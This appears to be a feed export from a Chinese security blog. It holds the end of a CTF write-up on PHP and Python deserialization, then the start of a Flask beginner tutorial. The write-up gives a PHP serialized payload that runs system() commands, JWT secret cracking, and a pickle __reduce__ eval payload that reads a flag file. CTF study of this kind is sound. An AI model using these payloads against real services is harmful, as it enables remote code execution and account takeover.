punctuation">{</span>    <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$disable_fun</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Hacker..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>果不其然过滤了很多命令执行的函数，用的<code>in_array</code>函数进行对比，但是可以看到改函数的<code>Test</code>方法，里面也调用了<code>gettime</code>方法，于是构造反序列化利用</p><p>exp：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string">"find / -name *flag*"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string">"system"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Test"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"p"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">19</span><span class="token punctuation">:</span><span class="token string">"find / -name *flag*"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"func"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"system"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>传入找到flag所在的文件</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200625155712200.png" alt="" loading="lazy"></p><p>尝试读取</p><pre class=" language-php"><code class="language-php">func<span class="token operator">=</span>unserialize<span class="token operator">&amp;</span>p<span class="token operator">=</span>O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Test"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"p"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">22</span><span class="token punctuation">:</span><span class="token string">"cat /tmp/flagoefiu4r93"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"func"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"system"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>得到flag</p><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h3 id="CISCN2019-华北赛区-Day1-Web2—ikun"><a href="#CISCN2019-华北赛区-Day1-Web2—ikun" class="headerlink" title="CISCN2019-华北赛区-Day1-Web2—ikun"></a>CISCN2019-华北赛区-Day1-Web2—ikun</h3><p>根据题目提示需要买到lv6的账号，于是写脚本找</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://4882ba34-0c83-48c1-b876-e1b21efa6a68.node3.buuoj.cn/shop?page={}"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"static/img/lv/lv6.png"</span> <span class="token keyword">in</span> a<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>跑出lv6在<code>page=181</code>的页面，点击购买钱不够，发现有折扣，于是抓包改折扣为0.0000001，随后提示需要是<code>admin</code>，抓包注意到有一个<code>jwt</code>的<code>cookie</code>，<a href="https://www.jianshu.com/p/576dbf44b2ae" target="_blank" rel="noopener">参考</a>，这里有一个编解码<a href="https://jwt.io/#debugger-io" target="_blank" rel="noopener">网站</a>，再找到爆破密钥脚本<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">网站</a>，跑出来密钥为<code>1kun</code>，放到编码网站编码后携带这个<code>jwt</code>的<code>cookie</code>发包，随后来到<code>b1g_m4mber</code>界面，查看源码得到<code>www.zip</code>源码包，找到关键利用的代码</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> tornado<span class="token punctuation">.</span>web<span class="token keyword">from</span> sshop<span class="token punctuation">.</span>base <span class="token keyword">import</span> BaseHandler<span class="token keyword">import</span> pickle<span class="token keyword">import</span> urllib<span class="token keyword">class</span> <span class="token class-name">AdminHandler</span><span class="token punctuation">(</span>BaseHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    @tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>authenticated    <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>current_user <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span><span class="token string">'This is Black Technology!'</span><span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'no_ass.html'</span><span class="token punctuation">)</span>    @tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>authenticated    <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            become <span class="token operator">=</span> self<span class="token punctuation">.</span>get_argument<span class="token punctuation">(</span><span class="token string">'become'</span><span class="token punctuation">)</span>            p <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>become<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span>p<span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span><span class="token string">'This is Black Technology!'</span><span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><p>明显的pickle反序列化利用，POST的<code>become</code>为利用点，随后构造反序列化利用poc：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: UTF-8 -*-</span><span class="token comment" spellcheck="true"># 题目是在python2环境下，需要用python2跑</span><span class="token keyword">import</span> pickle<span class="token keyword">import</span> urllib<span class="token keyword">class</span> <span class="token class-name">dairy</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> eval<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"open('/flag.txt','r').read()"</span><span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">//</span> eval直接读取文件today <span class="token operator">=</span> dairy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># print(pickle.dumps(today))</span>x <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>today<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>得到payload：</p><pre class=" language-python"><code class="language-python">c__builtin__<span class="token operator">%</span>0Aeval<span class="token operator">%</span>0Ap0<span class="token operator">%</span><span class="token number">0A</span><span class="token operator">%</span>28S<span class="token operator">%</span>22open<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">/</span>flag<span class="token punctuation">.</span>txt<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">2C</span><span class="token operator">%</span>27r<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29.</span>read<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>0Ap1<span class="token operator">%</span>0Atp2<span class="token operator">%</span>0ARp3<span class="token operator">%</span><span class="token number">0A</span><span class="token punctuation">.</span></code></pre><p>传入发包得到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;PHP&quot;&gt;&lt;a href=&quot;#PHP&quot; class=&quot;headerlink&quot; title=&quot;PHP&quot;&gt;&lt;/a&gt;PHP&lt;/h2&gt;&lt;p&gt;php中常用的几种魔术方法和触发条件&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;__construct ：当一个对象创建时被调用
__destruct ：当一个对象销毁时被调用
__toString ：当一个类或对象被当作一个字符串被调用
__wakeup ：当一个对象使用 unserialize 时触发，反序列化时触发
__sleep ：当一个对象使用 serialize 时触发，序列化时触发
__get ：当一个对象读取不可访问属性的值时触发
__set ：当一个对象在给不可访问属性赋值时
__isset ：当一个对象当对不可访问属性调用 isset 或 empty 时触发
__unset ：当一个对象对不可访问属性调用 unset 时触发
__invoke ：当一个对象尝试以调用函数的方式调用一个对象时触发
__set_state ：当一个对象调用 var_export 导出类时，此静态方法会被调用
__call ：当一个对象在对象上下文中调用不可访问的方法时触发 
__callStatic ：当一个对象在静态上下文中调用不可访问的方法时触发&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;不同属性之间的区别&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;public  变量（公有） 
直接将变量名反序列化出来 
protected  变量（受保护） 
\x00 + * + \x00 + 变量名 
private  变量（私有） 
\x00 + 类名 + \x00 + 变量名&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.extrader.top/categories/CTF/"/>
    
    
      <category term="CTF题" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
      <category term="反序列化" scheme="https://www.extrader.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>初识Flask</title>
    <link href="https://www.extrader.top/2020/03/28/%E5%88%9D%E8%AF%86Flask/"/>
    <id>https://www.extrader.top/2020/03/28/%E5%88%9D%E8%AF%86Flask/</id>
    <published>2020-03-27T16:00:00.000Z</published>
    <updated>2020-07-14T10:38:49.277Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%88%9D%E8%AF%86Flask/flask-icon.png" alt="" loading="lazy"></p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Flask是一个用Python编写的Web应用程序框架。 它由 <strong>Armin Ronacher</strong> 开发，他领导一个名为Pocco的国际Python爱好者团队。 Flask基于Werkzeug WSGI工具包和<a href="http://docs.jinkan.org/docs/jinja2/" target="_blank" rel="noopener">Jinja2</a>模板引擎。两者都是Pocco项目。</p><p><a href="https://dormousehole.readthedocs.io/en/latest/" target="_blank" rel="noopener">Flask中文文档</a></p><a id="more"></a><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Python2.7及以上，Python3.4及以上，我这里用的Python2.7</p><p><strong>安装virtualenv</strong></p><p>virtualenv可以创建一个独立的python运行环境，这个环境和系统的python环境是互不干扰的，也就是说你在这个环境中安装的python包不会安装到系统的python环境中，系统python环境中的包会复制到这个环境中（但新版本的virtualenv并不会复制过来，默认只安装<code>setuptools</code>，<code>wheel</code>和<code>pip</code>）</p><p>当然如果不想用系统的包的话可以加一些参数：</p><p><code>–-no-site-packages</code>：表示在建立虚拟环境时不将原版本中的第三方库拷贝过来，这样就能获得一个纯净的Python环境。（可这个参数新版的virtualenv好像用不了，我的就是这样，但网上都这样讲，=.=）</p><p><code>--no-setuptools</code>：不安装setuptools；<code>--no-wheel</code>：不安装whell；<code>--no-pip</code>：不安装pip</p><p>安装virtualenv包：</p><pre class=" language-shell"><code class="language-shell">pip install virtualenv</code></pre><p>创建环境：</p><pre class=" language-shell"><code class="language-shell">mkdir Flask  #创建项目目录cd Flaskvirtualenv -p C:\Python2\python.exe E:\flask\venv  #在这个项目中创建一个独立的python环境，环境命名为venv，-p表示指定python的版本路径.\venv\Scripts\activate  #启动虚拟环境;deactivate可退出此环境</code></pre><p>接下来就要在这个虚拟环境中安装Flask了</p><pre class=" language-shell"><code class="language-shell">E:\flask\venv\Scripts\python.exe -m pip list  #可看到当前虚拟环境中的所有的python包，当然不加路径也可以pip install Flask</code></pre><p>至此虚拟环境就搭建成功了，当然如果你不想用虚拟的python环境用系统自带的也可以</p><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask <span class="token comment" spellcheck="true">#导入Flask模块</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#使用当前模块作为参数</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'Hello World'</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p><code>app.route(rule, options)</code>：该函数为<code>Flask</code>类的一个方法，告诉应用程序哪个URL应该调用相关的函数</p><ul><li><strong>rule</strong>：参数表示与该函数的URL绑定</li><li><strong>endpoint</strong>：被注册的url的名字，一般用来反向生成url的时候使用，默认把视图函数的名字作为endpoint，如:endpoint=”login”</li><li><strong>options</strong>：是要转发给基础Rule对象的参数列表。</li></ul><p>上面的<code>&#39;/&#39;</code>表示URL与hello_world函数绑定，在浏览器中打开web服务器的主页时，将呈现该函数的输出</p><p><code>app.run(host, port, debug, options)</code>：表示本地开发服务器上运行应用程序</p><ul><li><strong>host</strong>：要监听的主机名。 默认为127.0.0.1（localhost）。设置为“0.0.0.0”以使服务器在外部可用</li><li><strong>port</strong>：端口设置，默认值为5000</li><li><strong>debug</strong>：默认为false。 如果设置为true，则提供调试信息</li><li><strong>options</strong>：要转发到底层的Werkzeug服务器。</li></ul><p>浏览器访问<code>http://127.0.0.1:5000/</code>即可看到函数的输出</p><h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flaskapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#@app.route('/hello')  #添加路由</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'Hello World'</span>app<span class="token punctuation">.</span>add_url_rule<span class="token punctuation">(</span><span class="token string">'/hello/'</span><span class="token punctuation">,</span><span class="token string">'hello'</span><span class="token punctuation">,</span>view_func<span class="token operator">=</span>hello_world<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p><code>app.add_url_rule(rule,endpoint,view_func,options)</code>：该方法与route类似</p><ul><li><strong>rule</strong>：一个字符串格式的url规则，如：”/login”</li><li><strong>endpoint</strong>：url规则的名字，用来反向生成url使用，默认是视图函数的名字。</li><li><strong>view_func</strong>：视图函数，当对应的endpoint名字被请求时需要调用的函数。</li><li><strong>options</strong>： 类似route时候的options，methods参数默认是只监听get</li></ul><h2 id="变量规则"><a href="#变量规则" class="headerlink" title="变量规则"></a>变量规则</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flaskapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/hello/&lt;name>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'Hello { }'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>在浏览器输入<code>http://127.0.0.1:5000/hello/flask</code>则会显示<code>Hello flask</code></p><p>除了默认字符串变量部分之外，还可以使用以下转换器构建规则：</p><ul><li><strong>int</strong>：接受整数，不为整数则404，<code>@app.route(&#39;/hello/&lt;int:name&gt;&#39;)</code></li><li><strong>float</strong>：接受浮点数，不为浮点数则404，<code>@app.route(&#39;/hello/&lt;float:name&gt;&#39;)</code></li><li><strong>path</strong>：接受用作目录分隔符的斜杠，<code>@app.route(&#39;/hello/&lt;path:name&gt;&#39;)</code></li></ul><h2 id="URL构建"><a href="#URL构建" class="headerlink" title="URL构建"></a>URL构建</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_forapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/name'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">return</span> <span class="token string">'hello Admin'</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/guest/&lt;guest>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_guest</span><span class="token punctuation">(</span>guest<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">return</span> <span class="token string">'Hello { } as Guest'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>guest<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/user/&lt;name>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_user</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">if</span> name <span class="token operator">==</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>       <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'hello_admin'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#redirect函数直接对route的路径进行访问，url_for直接对函数进行访问，一同使用则访问此路径下的函数</span>   <span class="token keyword">else</span><span class="token punctuation">:</span>       <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'hello_guest'</span><span class="token punctuation">,</span>guest <span class="token operator">=</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>   app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p><code>redirect(location, code=302, Response=None)</code>：该函数用来实现重定向功能</p><ul><li><strong>location</strong>：一个链接地址，可以使用url_for()函数得到，也可以是静态文件地址</li><li><strong>code</strong>：可以取值为301、302、303、305、307，默认302,300、304不可以</li><li><strong>Response</strong>：一个响应类，默认是werkzeug.wrappers.Response</li></ul><p>输入<code>http://127.0.0.1:5000/user/admin</code>则会302重定向到<code>http://127.0.0.1:5000/name</code>显示hello Admin</p><p><code>http://127.0.0.1:5000/user/flask</code>则会302重定向到<code>http://127.0.0.1:5000/guest/flask</code>，显示Hello flask as Guest</p><h2 id="HTTP方法"><a href="#HTTP方法" class="headerlink" title="HTTP方法"></a>HTTP方法</h2><p>首先创建一个HTML表单，使用POST方法将表单数据发送到URL，命名为login.html</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>      &lt;form action = "http://localhost:5000/login" method = "post">         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Enter Name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>&lt;input type = "text" name = "nm" /><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>&lt;input type = "submit" value = "submit" /><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> requestapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/success/&lt;name>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">success</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">return</span> <span class="token string">'welcome { }'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>name<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span>methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>       user <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'nm'</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#获取参数nm的值</span>       <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">,</span>name <span class="token operator">=</span> user<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">else</span><span class="token punctuation">:</span>       user <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'nm'</span><span class="token punctuation">)</span>       <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">,</span>name <span class="token operator">=</span> user<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>   app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p><strong>Request</strong>对象</p><ul><li><strong>Form</strong>：是一个字典对象,包含表单参数及其值的键和值对。</li><li><strong>args</strong>：解析查询字符串的内容，是包含表单参数对及其对应值对的列表的字典对象</li><li><strong>Cookies</strong>：保存Cookie名称和值的字典对象。</li><li><strong>files</strong>：与上传文件有关的数据。</li><li><strong>method</strong>：当前请求方法。</li></ul><p>输入flask回车后先跳转到<code>http://127.0.0.1:5000/login</code>然后自动POST一个nm参数后302重定向到<code>http://127.0.0.1:5000/success/flask</code>输出welcome flask</p><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flaskapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">return</span> <span class="token string">'&lt;h1>Hello World&lt;/h1>'</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>   app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>访问网站会得到一个Hello World标题，但这样吧标签插入在python代码中就很麻烦，于是这里就引入了<strong>Jinja2</strong>模板引擎，可以通过<strong>render_template()</strong>函数呈现HTML文件。</p><p>新建一个templates文件夹，在其中建立一个hello.html文件：</p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!doctype html></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Hello { {  marks }}!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></code></pre><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_templateapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/hello/'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/hello/&lt;score>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_name</span><span class="token punctuation">(</span>score<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">return</span> render_template<span class="token 